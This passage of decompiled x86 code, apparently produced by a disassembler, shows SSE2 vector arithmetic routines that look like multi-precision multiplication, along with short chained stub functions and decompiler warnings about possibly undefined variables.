  v58 = _mm_load_si128(&v153);
  v59 = _mm_mul_epu32(_mm_load_si128(&v142), v58);
  v61 = _mm_mul_epu32(v58, *v60);
  v62 = _mm_load_si128(&stru_4BACE0);
  v63 = _mm_add_epi32(v57, _mm_and_si128(v62, v59));
  v64 = _mm_add_epi32(v56, _mm_srli_epi32(v59, 0x10u));
  v65 = _mm_and_si128(v62, v61);
  v66 = _mm_srli_epi32(v61, 0x10u);
  sub_44913B();
  v67 = _mm_move_epi64(v65);
  v68 = _mm_move_epi64(v66);
  v69 = _mm_add_epi32(v63, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v65, v67), v67), 4));
  v70 = _mm_add_epi32(v64, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v66, v68), v68), 4));
  *(_DWORD *)(v71 + 16) = _mm_cvtsi128_si32(v69);
  v72 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v69), 0x10u), _mm_move_epi64(v70));
  v73 = _mm_unpackhi_epi64(v70, v67);
  *(_QWORD *)(v71 + 18) = v72.m128i_i64[0];
  v74 = _mm_add_epi32(_mm_unpackhi_epi64(v69, v67), _mm_srli_epi64(v72, 0x30u));
  v76 = _mm_load_si128(&v153);
  v77 = _mm_mul_epu32(_mm_load_si128(&v143), v76);
  v78 = _mm_mul_epu32(v76, v75[1]);
  v79 = _mm_load_si128(&stru_4BACE0);
  v80 = _mm_add_epi32(v74, _mm_and_si128(v79, v77));
  v81 = _mm_add_epi32(v73, _mm_srli_epi32(v77, 0x10u));
  v82 = _mm_and_si128(v79, v78);
  v83 = _mm_srli_epi32(v78, 0x10u);
  sub_449178();
  v84 = _mm_move_epi64(v82);
  v85 = _mm_move_epi64(v83);
  v86 = _mm_add_epi32(v80, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v82, v84), v84), 4));
  v87 = _mm_add_epi32(v81, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v83, v85), v85), 4));
  *(_DWORD *)(v88 + 24) = _mm_cvtsi128_si32(v86);
  v89 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v86), 0x10u), _mm_move_epi64(v87));
  v90 = _mm_unpackhi_epi64(v87, v84);
  *(_QWORD *)(v88 + 26) = v89.m128i_i64[0];
  v91 = _mm_add_epi32(_mm_unpackhi_epi64(v86, v84), _mm_srli_epi64(v89, 0x30u));
  v92 = _mm_load_si128(&v154);
  v93 = _mm_mul_epu32(_mm_load_si128(&v143), v92);
  v95 = _mm_mul_epu32(v92, *v94);
  v96 = _mm_load_si128(&stru_4BACE0);
  v97 = _mm_add_epi32(v91, _mm_and_si128(v96, v93));
  v98 = _mm_add_epi32(v90, _mm_srli_epi32(v93, 0x10u));
  v99 = _mm_and_si128(v96, v95);
  v100 = _mm_srli_epi32(v95, 0x10u);
  sub_4491B5();
  v101 = _mm_move_epi64(v99);
  v102 = _mm_move_epi64(v100);
  v103 = _mm_add_epi32(v97, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v99, v101), v101), 4));
  v104 = _mm_add_epi32(v98, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v100, v102), v102), 4));
  *(_DWORD *)(v105 + 32) = _mm_cvtsi128_si32(v103);
  v106 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v103), 0x10u), _mm_move_epi64(v104));
  v107 = _mm_unpackhi_epi64(v104, v101);
  *(_QWORD *)(v105 + 34) = v106.m128i_i64[0];
  v108 = _mm_add_epi32(_mm_unpackhi_epi64(v103, v101), _mm_srli_epi64(v106, 0x30u));
  v110 = _mm_load_si128(&v154);
  v111 = _mm_mul_epu32(_mm_load_si128(&v144), v110);
  v112 = _mm_mul_epu32(v110, v109[1]);
  v113 = _mm_load_si128(&stru_4BACE0);
  v114 = _mm_add_epi32(v108, _mm_and_si128(v113, v111));
  v115 = _mm_add_epi32(v107, _mm_srli_epi32(v111, 0x10u));
  v116 = _mm_and_si128(v113, v112);
  v117 = _mm_srli_epi32(v112, 0x10u);
  sub_4491F2((int)&v144, &v154);
  v118 = _mm_move_epi64(v116);
  v119 = _mm_move_epi64(v117);
  v120 = _mm_add_epi32(v114, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v116, v118), v118), 4));
  v121 = _mm_add_epi32(v115, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v117, v119), v119), 4));
  *(_DWORD *)(v122 + 40) = _mm_cvtsi128_si32(v120);
  v123 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v120), 0x10u), _mm_move_epi64(v121));
  v124 = _mm_unpackhi_epi64(v121, v118);
  *(_QWORD *)(v122 + 42) = v123.m128i_i64[0];
  v125 = _mm_add_epi32(_mm_unpackhi_epi64(v120, v118), _mm_srli_epi64(v123, 0x30u));
  v126 = _mm_load_si128(&v155);
  v127 = _mm_mul_epu32(_mm_load_si128(&v144), v126);
  v129 = _mm_mul_epu32(v126, *v128);
  v130 = _mm_load_si128(&stru_4BACE0);
  v131 = _mm_and_si128(v130, v127);
  v132 = _mm_add_epi32(v124, _mm_srli_epi32(v127, 0x10u));
  v133 = _mm_and_si128(v130, v129);
  v134 = _mm_srli_epi32(v129, 0x10u);
  v135 = _mm_move_epi64(v133);
  v136 = _mm_move_epi64(v134);
  v137 = _mm_add_epi32(
           _mm_add_epi32(v125, v131),
           _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v133, v135), v135), 4));
  v138 = _mm_add_epi32(v132, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v134, v136), v136), 4));
  *(_DWORD *)(v122 + 48) = _mm_cvtsi128_si32(v137);
  v139 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v137), 0x10u), _mm_move_epi64(v138));
  *(_QWORD *)(v122 + 50) = v139.m128i_i64[0];
  *(_QWORD *)(v122 + 56) = _mm_add_epi64(
                             _mm_add_epi32(_mm_unpackhi_epi64(v137, v135), _mm_srli_epi64(v139, 0x30u)),
                             _mm_slli_epi64(_mm_unpackhi_epi64(v138, v135), 0x10u)).m128i_u64[0];
}
// 4492A4: variable 'v19' is possibly undefined
// 4492DA: variable 'v25' is possibly undefined
// 449308: variable 'v33' is possibly undefined
// 449377: variable 'v41' is possibly undefined
// 4493E3: variable 'v54' is possibly undefined
// 44941A: variable 'v60' is possibly undefined
// 449473: variable 'v71' is possibly undefined
// 44949A: variable 'v75' is possibly undefined
// 449506: variable 'v88' is possibly undefined
// 44953D: variable 'v94' is possibly undefined
// 449596: variable 'v105' is possibly undefined
// 4495BD: variable 'v109' is possibly undefined
// 449629: variable 'v122' is possibly undefined
// 44965E: variable 'v128' is possibly undefined
// 4BACE0: using guessed type __m128i stru_4BACE0;

//----- (00449084) --------------------------------------------------------
int sub_449084()
{
  return sub_4490C1();
}
// 4490C1: using guessed type int sub_4490C1(void);

//----- (004490C1) --------------------------------------------------------
int sub_4490C1()
{
  return sub_4490FE();
}
// 4490FE: using guessed type int sub_4490FE(void);

//----- (004490FE) --------------------------------------------------------
int sub_4490FE()
{
  return sub_44913B();
}
// 44913B: using guessed type int sub_44913B(void);

//----- (0044913B) --------------------------------------------------------
int sub_44913B()
{
  return sub_449178();
}
// 449178: using guessed type int sub_449178(void);

//----- (00449178) --------------------------------------------------------
int sub_449178()
{
  return sub_4491B5();
}
// 4491B5: using guessed type int sub_4491B5(void);

//----- (004491B5) --------------------------------------------------------
int sub_4491B5()
{
  return sub_4491F2();
}
// 4491F2: using guessed type int sub_4491F2(void);

//----- (004491F2) --------------------------------------------------------
__m128i __usercall sub_4491F2@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>)
{
  return _mm_srli_epi32(_mm_mul_epu32(_mm_load_si128((const __m128i *)(a1 - 16)), _mm_load_si128(a2 + 1)), 0x10u);
}

//----- (004496F0) --------------------------------------------------------
void __cdecl sub_4496F0(int a1, int a2, int a3)
{
  unsigned int i; // edx
  __m128i v4; // xmm0
  __m128i v5; // xmm1
  __m128i v6; // xmm2
  __m128i v7; // xmm7
  __m128i v8; // xmm0
  __m128i v9; // xmm7
  __m128i si128; // xmm6
  __m128i v11; // xmm4
  __m128i v12; // xmm5
  __m128i v13; // xmm6
  __m128i v14; // xmm7
  __m128i v15; // xmm0
  __m128i v16; // xmm1
  __m128i v17; // xmm4
  __m128i v18; // xmm5
  int v19; // ecx
  __m128i v20; // xmm6
  __m128i v21; // xmm5
  __m128i v22; // xmm4
  __m128i v23; // xmm7
  __m128i v24; // xmm0
  __m128i *v25; // edx
  __m128i v26; // xmm7
  __m128i v27; // xmm6
  __m128i v28; // xmm4
  __m128i v29; // xmm5
  __m128i v30; // xmm6
  __m128i v31; // xmm7
  unsigned int v32; // eax
  int v33; // ecx
  __m128i v34; // xmm0
  __m128i v35; // xmm1
  __m128i v36; // xmm4
  __m128i v37; // xmm5
  __m128i v38; // xmm6
  __m128i v39; // xmm5
  __m128i v40; // xmm4
  __m128i *v41; // edx
  __m128i v42; // xmm7
  __m128i v43; // xmm0
  __m128i v44; // xmm7
  __m128i v45; // xmm6
  __m128i v46; // xmm4
  __m128i v47; // xmm5
  __m128i v48; // xmm6
  __m128i v49; // xmm7
  __m128i v50; // xmm0
  __m128i v51; // xmm1
  __m128i v52; // xmm4
  __m128i v53; // xmm5
  int v54; // ecx
  __m128i v55; // xmm6
  __m128i v56; // xmm5
  __m128i v57; // xmm4
  __m128i v58; // xmm7
  __m128i v59; // xmm0
  __m128i *v60; // edx
  __m128i v61; // xmm7
  __m128i v62; // xmm6
  __m128i v63; // xmm4
  __m128i v64; // xmm5
  __m128i v65; // xmm6
  __m128i v66; // xmm7
  __m128i v67; // xmm0
  __m128i v68; // xmm1
  __m128i v69; // xmm4
  __m128i v70; // xmm5
  int v71; // ecx
  __m128i v72; // xmm6
  __m128i v73; // xmm5
  __m128i v74; // xmm4
  __m128i *v75; // edx
  __m128i v76; // xmm7
  __m128i v77; // xmm0
  __m128i v78; // xmm7
  __m128i v79; // xmm6
  __m128i v80; // xmm4
  __m128i v81; // xmm5
  __m128i v82; // xmm6
  __m128i v83; // xmm7
  __m128i v84; // xmm0
  __m128i v85; // xmm1
  __m128i v86; // xmm4
  __m128i v87; // xmm5
  int v88; // ecx
  __m128i v89; // xmm6
  __m128i v90; // xmm5
  __m128i v91; // xmm4
  __m128i v92; // xmm7
  __m128i v93; // xmm0
  __m128i *v94; // edx
  __m128i v95; // xmm7
  __m128i v96; // xmm6
  __m128i v97; // xmm4
  __m128i v98; // xmm5
  __m128i v99; // xmm6
  __m128i v100; // xmm7
  __m128i v101; // xmm0
  __m128i v102; // xmm1
  __m128i v103; // xmm4
  __m128i v104; // xmm5
  int v105; // ecx
  __m128i v106; // xmm6
  __m128i v107; // xmm5
  __m128i v108; // xmm4
  __m128i *v109; // edx
  __m128i v110; // xmm7
  __m128i v111; // xmm0
  __m128i v112; // xmm7
  __m128i v113; // xmm6
  __m128i v114; // xmm4
  __m128i v115; // xmm5
  __m128i v116; // xmm6
  __m128i v117; // xmm7
  __m128i v118; // xmm0
  __m128i v119; // xmm1
  __m128i v120; // xmm4
  __m128i v121; // xmm5
  int v122; // ecx
  __m128i v123; // xmm6
  __m128i v124; // xmm5
  __m128i v125; // xmm4
  __m128i v126; // xmm7
  __m128i v127; // xmm0
  __m128i *v128; // edx
  __m128i v129; // xmm7
  __m128i v130; // xmm6
  __m128i v131; // xmm4
  __m128i v132; // xmm5
  __m128i v133; // xmm6
  __m128i v134; // xmm7
  __m128i v135; // xmm0
  __m128i v136; // xmm1
  __m128i v137; // xmm4
  __m128i v138; // xmm5
  int v139; // ecx
  __m128i v140; // xmm6
  __m128i v141; // xmm5
  __m128i v142; // xmm4
  __m128i *v143; // edx
  __m128i v144; // xmm7
  __m128i v145; // xmm0
  __m128i v146; // xmm7
  __m128i v147; // xmm6
  __m128i v148; // xmm4
  __m128i v149; // xmm5
  __m128i v150; // xmm6
  __m128i v151; // xmm7
  __m128i v152; // xmm0
  __m128i v153; // xmm1
  __m128i v154; // xmm4
  __m128i v155; // xmm5
  int v156; // ecx
  __m128i v157; // xmm6
  __m128i v158; // xmm5
  __m128i v159; // xmm4
  __m128i v160; // xmm7
  __m128i v161; // xmm0
  __m128i *v162; // edx
  __m128i v163; // xmm7
  __m128i v164; // xmm6
  __m128i v165; // xmm4
  __m128i v166; // xmm5
  __m128i v167; // xmm6
  __m128i v168; // xmm7
  __m128i v169; // xmm0
  __m128i v170; // xmm1
  __m128i v171; // xmm4
  __m128i v172; // xmm5
  int v173; // ecx
  __m128i v174; // xmm6
  __m128i v175; // xmm5
  __m128i v176; // xmm4
  __m128i *v177; // edx
  __m128i v178; // xmm7
  __m128i v179; // xmm0
  __m128i v180; // xmm7
  __m128i v181; // xmm6
  __m128i v182; // xmm4
  __m128i v183; // xmm5
  __m128i v184; // xmm6
  __m128i v185; // xmm7
  __m128i v186; // xmm0
  __m128i v187; // xmm1
  __m128i v188; // xmm4
  __m128i v189; // xmm5
  int v190; // ecx
  __m128i v191; // xmm6
  __m128i v192; // xmm5
  __m128i v193; // xmm4
  __m128i v194; // xmm7
  __m128i v195; // xmm0
  __m128i *v196; // edx
  __m128i v197; // xmm7
  __m128i v198; // xmm6
  __m128i v199; // xmm4
  __m128i v200; // xmm5
  __m128i v201; // xmm6
  __m128i v202; // xmm7
  __m128i v203; // xmm0
  __m128i v204; // xmm1
  __m128i v205; // xmm4
  __m128i v206; // xmm5
  int v207; // ecx
  __m128i v208; // xmm6
  __m128i v209; // xmm5
  __m128i v210; // xmm4
  __m128i *v211; // edx
  __m128i v212; // xmm7
  __m128i v213; // xmm0
  __m128i v214; // xmm7
  __m128i v215; // xmm6
  __m128i v216; // xmm4
  __m128i v217; // xmm5
  __m128i v218; // xmm6
  __m128i v219; // xmm7
  __m128i v220; // xmm0
  __m128i v221; // xmm1
  __m128i v222; // xmm4
  __m128i v223; // xmm5
  int v224; // ecx
  __m128i v225; // xmm6
  __m128i v226; // xmm5
  __m128i v227; // xmm4
  __m128i v228; // xmm7
  __m128i v229; // xmm0
  __m128i *v230; // edx
  __m128i v231; // xmm7
  __m128i v232; // xmm6
  __m128i v233; // xmm4
  __m128i v234; // xmm5
  __m128i v235; // xmm6
  __m128i v236; // xmm7
  __m128i v237; // xmm0
  __m128i v238; // xmm1
  __m128i v239; // xmm4
  __m128i v240; // xmm5
  int v241; // ecx
  __m128i v242; // xmm6
  __m128i v243; // xmm5
  __m128i v244; // xmm4
  __m128i *v245; // edx
  __m128i v246; // xmm7
  __m128i v247; // xmm0
  __m128i v248; // xmm7
  __m128i v249; // xmm6
  __m128i v250; // xmm4
  __m128i v251; // xmm5
  __m128i v252; // xmm6
  __m128i v253; // xmm7
  __m128i v254; // xmm0
  __m128i v255; // xmm1
  __m128i v256; // xmm4
  __m128i v257; // xmm5
  int v258; // ecx
  __m128i v259; // xmm6
  __m128i v260; // xmm5
  __m128i v261; // xmm4
  __m128i v262; // xmm7
  __m128i v263; // xmm0
  __m128i *v264; // edx
  __m128i v265; // xmm7
  __m128i v266; // xmm6
  __m128i v267; // xmm2
  __m128i v268; // xmm5
  __m128i v269; // xmm6
  __m128i v270; // xmm7
  __m128i v271; // xmm0
  __m128i v272; // xmm1
  __m128i v273; // xmm4
  __m128i v274; // xmm5
  __m128i v275; // xmm6
  _DWORD v276[33]; // [esp-4h] [ebp-320h] BYREF
  __m128i v277; // [esp+90h] [ebp-28Ch] BYREF
  __m128i v278; // [esp+A0h] [ebp-27Ch] BYREF
  __m128i v279; // [esp+B0h] [ebp-26Ch] BYREF
  __m128i v280; // [esp+C0h] [ebp-25Ch] BYREF
  __m128i v281; // [esp+D0h] [ebp-24Ch] BYREF
  __m128i v282; // [esp+E0h] [ebp-23Ch] BYREF
  __m128i v283; // [esp+F0h] [ebp-22Ch] BYREF
  __m128i v284; // [esp+100h] [ebp-21Ch] BYREF
  __m128i v285; // [esp+110h] [ebp-20Ch]
  __m128i v286[7]; // [esp+120h] [ebp-1FCh]
  __m128i v287; // [esp+190h] [ebp-18Ch]
  __m128i v288; // [esp+1A0h] [ebp-17Ch]
  __m128i v289; // [esp+1B0h] [ebp-16Ch]
  __m128i v290; // [esp+1C0h] [ebp-15Ch]
  __m128i v291; // [esp+1D0h] [ebp-14Ch]
  __m128i v292; // [esp+1E0h] [ebp-13Ch]
  __m128i v293; // [esp+1F0h] [ebp-12Ch]
  __int128 v294[7]; // [esp+210h] [ebp-10Ch]
  __m128i v295; // [esp+280h] [ebp-9Ch] BYREF
  __m128i v296; // [esp+290h] [ebp-8Ch] BYREF
  __m128i v297; // [esp+2A0h] [ebp-7Ch] BYREF
  __m128i v298; // [esp+2B0h] [ebp-6Ch] BYREF
  __m128i v299; // [esp+2C0h] [ebp-5Ch] BYREF
  __m128i v300; // [esp+2D0h] [ebp-4Ch] BYREF
  __m128i v301; // [esp+2E0h] [ebp-3Ch] BYREF
  __m128i v302; // [esp+2F0h] [ebp-2Ch] BYREF
  __m128i v303; // [esp+300h] [ebp-1Ch] BYREF
  int v304; // [esp+310h] [ebp-Ch] BYREF

  v276[0] = &v304;
  for ( i = 0; i != 128; i += 16 )
  {
    v4 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 216);
    v5 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 141);
    v6 = _mm_shuffle_epi32(*(__m128i *)(a3 + i), 216);
    *(__m128i *)&v276[i / 2 + 5] = v4;
    *(__m128i *)&v276[i / 2 + 9] = _mm_srli_epi64(v4, 0x20u);
    *(__m128i *)((char *)&v285 + 2 * i) = v5;
    v286[i / 8] = _mm_srli_epi64(v5, 0x20u);
    v294[i / 8] = (__int128)v6;
    v294[i / 8 + 1] = (__int128)_mm_srli_epi64(v6, 0x20u);
  }
  v7 = _mm_load_si128(&v295);
  v8 = _mm_mul_epu32(_mm_load_si128(&v277), v7);
  v9 = _mm_mul_epu32(v7, v287);
  si128 = _mm_load_si128(&stru_4BACE0);
  v11 = _mm_add_epi32((__m128i)0i64, _mm_and_si128(si128, v8));
  v12 = _mm_add_epi32(
          _mm_slli_epi64(
            _mm_add_epi32(
              _mm_add_epi32(
                _mm_add_epi32(
                  _mm_add_epi32(
                    _mm_add_epi32(
                      _mm_add_epi32(
                        _mm_add_epi32(
                          _mm_add_epi32(
                            _mm_add_epi32(
                              _mm_add_epi32(
                                _mm_add_epi32(
                                  _mm_add_epi32(
                                    _mm_add_epi32(
                                      _mm_add_epi32(
                                        _mm_add_epi32(
                                          (__m128i)0i64,
                                          _mm_srli_epi64(
                                            _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v276[135]), v293),
                                            0x30u)),
                                        _mm_srli_epi64(
                                          _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v302.m128i_i8[8]), v285),
                                          0x30u)),
                                      _mm_srli_epi64(
                                        _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v276[139]), v292),
                                        0x30u)),
                                    _mm_srli_epi64(
                                      _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v301.m128i_i8[8]), v286[0]),
                                      0x30u)),
                                  _mm_srli_epi64(
                                    _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v276[143]), v291),
                                    0x30u)),
                                _mm_srli_epi64(
                                  _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v300.m128i_i8[8]), v286[1]),
                                  0x30u)),
                              _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v276[147]), v290), 0x30u)),
                            _mm_srli_epi64(
                              _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v299.m128i_i8[8]), v286[2]),
                              0x30u)),
                          _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v276[151]), v289), 0x30u)),
                        _mm_srli_epi64(
                          _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v298.m128i_i8[8]), v286[3]),
                          0x30u)),
                      _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v276[155]), v288), 0x30u)),
                    _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v297.m128i_i8[8]), v286[4]), 0x30u)),
                  _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v276[159]), v287), 0x30u)),
                _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v296.m128i_i8[8]), v286[5]), 0x30u)),
              _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v295.m128i_i8[8]), v286[6]), 0x30u)),
            0x20u),
          _mm_srli_epi32(v8, 0x10u));
  v13 = _mm_and_si128(si128, v9);
  v14 = _mm_srli_epi32(v9, 0x10u);
  sub_4498B2();
  v15 = _mm_move_epi64(v13);
  v16 = _mm_move_epi64(v14);
  v17 = _mm_add_epi32(v11, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v13, v15), v15), 4));
  v18 = _mm_add_epi32(v12, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v14, v16), v16), 4));
  *(_DWORD *)v19 = _mm_cvtsi128_si32(v17);
  v20 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v17), 0x10u), _mm_move_epi64(v18));
  v21 = _mm_unpackhi_epi64(v18, v15);
  *(_QWORD *)(v19 + 2) = v20.m128i_i64[0];
  v22 = _mm_add_epi32(_mm_unpackhi_epi64(v17, v15), _mm_srli_epi64(v20, 0x30u));
  v23 = _mm_load_si128(&v296);
  v24 = _mm_mul_epu32(_mm_load_si128(&v277), v23);
  v26 = _mm_mul_epu32(v23, *v25);
  v27 = _mm_load_si128(&stru_4BACE0);
  v28 = _mm_add_epi32(v22, _mm_and_si128(v27, v24));
  v29 = _mm_add_epi32(v21, _mm_srli_epi32(v24, 0x10u));
  v30 = _mm_and_si128(v27, v26);
  v31 = _mm_srli_epi32(v26, 0x10u);
  v32 = sub_4498F2();
  v34 = _mm_move_epi64(v30);
  v35 = _mm_move_epi64(v31);
  v36 = _mm_add_epi32(
          _mm_add_epi32(
            v28,
            _mm_srli_epi32(
              _mm_cmpgt_epi32(
                _mm_srli_epi32(_mm_cvtsi32_si128(*(_DWORD *)(v33 + 4)), 0x10u),
                _mm_cvtsi32_si128(HIWORD(v32))),
              0x1Fu)),
          _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v30, v34), v34), 4));
  v37 = _mm_add_epi32(v29, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v31, v35), v35), 4));
  *(_DWORD *)v33 = _mm_cvtsi128_si32(v36);
  v38 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v36), 0x10u), _mm_move_epi64(v37));
  v39 = _mm_unpackhi_epi64(v37, v34);
  *(_QWORD *)(v33 + 2) = v38.m128i_i64[0];
  v40 = _mm_add_epi32(_mm_unpackhi_epi64(v36, v34), _mm_srli_epi64(v38, 0x30u));
  v42 = _mm_load_si128(&v296);
  v43 = _mm_mul_epu32(_mm_load_si128(&v278), v42);
  v44 = _mm_mul_epu32(v42, v41[1]);
  v45 = _mm_load_si128(&stru_4BACE0);
  v46 = _mm_add_epi32(v40, _mm_and_si128(v45, v43));
  v47 = _mm_add_epi32(v39, _mm_srli_epi32(v43, 0x10u));
  v48 = _mm_and_si128(v45, v44);
  v49 = _mm_srli_epi32(v44, 0x10u);
  sub_44992F();
  v50 = _mm_move_epi64(v48);
  v51 = _mm_move_epi64(v49);
  v52 = _mm_add_epi32(v46, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v48, v50), v50), 4));
  v53 = _mm_add_epi32(v47, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v49, v51), v51), 4));
  *(_DWORD *)(v54 + 8) = _mm_cvtsi128_si32(v52);
  v55 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v52), 0x10u), _mm_move_epi64(v53));
  v56 = _mm_unpackhi_epi64(v53, v50);
  *(_QWORD *)(v54 + 10) = v55.m128i_i64[0];
  v57 = _mm_add_epi32(_mm_unpackhi_epi64(v52, v50), _mm_srli_epi64(v55, 0x30u));
  v58 = _mm_load_si128(&v297);
  v59 = _mm_mul_epu32(_mm_load_si128(&v278), v58);
  v61 = _mm_mul_epu32(v58, *v60);
  v62 = _mm_load_si128(&stru_4BACE0);
  v63 = _mm_add_epi32(v57, _mm_and_si128(v62, v59));
  v64 = _mm_add_epi32(v56, _mm_srli_epi32(v59, 0x10u));
  v65 = _mm_and_si128(v62, v61);
  v66 = _mm_srli_epi32(v61, 0x10u);
  sub_44996C();
  v67 = _mm_move_epi64(v65);
  v68 = _mm_move_epi64(v66);
  v69 = _mm_add_epi32(v63, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v65, v67), v67), 4));
  v70 = _mm_add_epi32(v64, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v66, v68), v68), 4));
  *(_DWORD *)(v71 + 16) = _mm_cvtsi128_si32(v69);
  v72 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v69), 0x10u), _mm_move_epi64(v70));
  v73 = _mm_unpackhi_epi64(v70, v67);
  *(_QWORD *)(v71 + 18) = v72.m128i_i64[0];
  v74 = _mm_add_epi32(_mm_unpackhi_epi64(v69, v67), _mm_srli_epi64(v72, 0x30u));
  v76 = _mm_load_si128(&v297);
  v77 = _mm_mul_epu32(_mm_load_si128(&v279), v76);
  v78 = _mm_mul_epu32(v76, v75[1]);
  v79 = _mm_load_si128(&stru_4BACE0);
  v80 = _mm_add_epi32(v74, _mm_and_si128(v79, v77));
  v81 = _mm_add_epi32(v73, _mm_srli_epi32(v77, 0x10u));
  v82 = _mm_and_si128(v79, v78);
  v83 = _mm_srli_epi32(v78, 0x10u);
  sub_4499A9();
  v84 = _mm_move_epi64(v82);
  v85 = _mm_move_epi64(v83);
  v86 = _mm_add_epi32(v80, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v82, v84), v84), 4));
  v87 = _mm_add_epi32(v81, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v83, v85), v85), 4));
  *(_DWORD *)(v88 + 24) = _mm_cvtsi128_si32(v86);
  v89 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v86), 0x10u), _mm_move_epi64(v87));
  v90 = _mm_unpackhi_epi64(v87, v84);
  *(_QWORD *)(v88 + 26) = v89.m128i_i64[0];
  v91 = _mm_add_epi32(_mm_unpackhi_epi64(v86, v84), _mm_srli_epi64(v89, 0x30u));
  v92 = _mm_load_si128(&v298);
  v93 = _mm_mul_epu32(_mm_load_si128(&v279), v92);
  v95 = _mm_mul_epu32(v92, *v94);
  v96 = _mm_load_si128(&stru_4BACE0);
  v97 = _mm_add_epi32(v91, _mm_and_si128(v96, v93));
  v98 = _mm_add_epi32(v90, _mm_srli_epi32(v93, 0x10u));
  v99 = _mm_and_si128(v96, v95);
  v100 = _mm_srli_epi32(v95, 0x10u);
  sub_4499E6();
  v101 = _mm_move_epi64(v99);
  v102 = _mm_move_epi64(v100);
  v103 = _mm_add_epi32(v97, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v99, v101), v101), 4));
  v104 = _mm_add_epi32(v98, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v100, v102), v102), 4));
  *(_DWORD *)(v105 + 32) = _mm_cvtsi128_si32(v103);
  v106 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v103), 0x10u), _mm_move_epi64(v104));
  v107 = _mm_unpackhi_epi64(v104, v101);
  *(_QWORD *)(v105 + 34) = v106.m128i_i64[0];
  v108 = _mm_add_epi32(_mm_unpackhi_epi64(v103, v101), _mm_srli_epi64(v106, 0x30u));
  v110 = _mm_load_si128(&v298);
  v111 = _mm_mul_epu32(_mm_load_si128(&v280), v110);
  v112 = _mm_mul_epu32(v110, v109[1]);
  v113 = _mm_load_si128(&stru_4BACE0);
  v114 = _mm_add_epi32(v108, _mm_and_si128(v113, v111));
  v115 = _mm_add_epi32(v107, _mm_srli_epi32(v111, 0x10u));
  v116 = _mm_and_si128(v113, v112);
  v117 = _mm_srli_epi32(v112, 0x10u);
  sub_449A23();
  v118 = _mm_move_epi64(v116);
  v119 = _mm_move_epi64(v117);
  v120 = _mm_add_epi32(v114, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v116, v118), v118), 4));
  v121 = _mm_add_epi32(v115, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v117, v119), v119), 4));
  *(_DWORD *)(v122 + 40) = _mm_cvtsi128_si32(v120);
  v123 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v120), 0x10u), _mm_move_epi64(v121));
  v124 = _mm_unpackhi_epi64(v121, v118);
  *(_QWORD *)(v122 + 42) = v123.m128i_i64[0];
  v125 = _mm_add_epi32(_mm_unpackhi_epi64(v120, v118), _mm_srli_epi64(v123, 0x30u));
  v126 = _mm_load_si128(&v299);
  v127 = _mm_mul_epu32(_mm_load_si128(&v280), v126);
  v129 = _mm_mul_epu32(v126, *v128);
  v130 = _mm_load_si128(&stru_4BACE0);
  v131 = _mm_add_epi32(v125, _mm_and_si128(v130, v127));
  v132 = _mm_add_epi32(v124, _mm_srli_epi32(v127, 0x10u));
  v133 = _mm_and_si128(v130, v129);
  v134 = _mm_srli_epi32(v129, 0x10u);
  sub_449A60();
  v135 = _mm_move_epi64(v133);
  v136 = _mm_move_epi64(v134);
  v137 = _mm_add_epi32(v131, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v133, v135), v135), 4));
